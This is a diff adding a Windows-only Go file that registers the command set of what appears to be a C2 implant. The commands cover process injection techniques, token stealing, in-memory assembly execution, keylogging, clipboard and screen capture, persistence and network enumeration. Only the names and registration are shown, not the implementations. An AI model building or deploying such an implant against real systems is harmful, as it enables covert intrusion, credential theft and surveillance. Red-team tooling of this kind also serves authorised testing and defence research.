@@ -1,0 +1,34 @@
+//go:build windows
+
+package commands
+
+// registerPlatformCommands registers Windows-specific commands
+func registerPlatformCommands() {
+	RegisterCommand(&ReadMemoryCommand{})
+	RegisterCommand(&WriteMemoryCommand{})
+	RegisterCommand(&AutoPatchCommand{})
+	RegisterCommand(&StartCLRCommand{})
+	RegisterCommand(&InlineAssemblyCommand{})
+	RegisterCommand(&InlineExecuteCommand{})
+	RegisterCommand(&VanillaInjectionCommand{})
+	RegisterCommand(&ThreadlessInjectCommand{})
+	RegisterCommand(&MakeTokenCommand{})
+	RegisterCommand(&StealTokenCommand{})
+	RegisterCommand(&Rev2SelfCommand{})
+	RegisterCommand(&TsCommand{})
+	RegisterCommand(&ApcInjectionCommand{})
+	RegisterCommand(&PoolPartyInjectionCommand{})
+	RegisterCommand(&ScreenshotCommand{})
+	RegisterCommand(&SpawnCommand{})
+	RegisterCommand(&OpusInjectionCommand{})
+	RegisterCommand(&RegReadCommand{})
+	RegisterCommand(&RegWriteCommand{})
+	RegisterCommand(&ClipboardCommand{})
+	RegisterCommand(&PersistCommand{})
+	RegisterCommand(&SchtaskCommand{})
+	RegisterCommand(&ServiceCommand{})
+	RegisterCommand(&NetEnumCommand{})
+	RegisterCommand(&NetSharesCommand{})
+	RegisterCommand(&WmiCommand{})
+	RegisterCommand(&KeylogCommand{})
+}
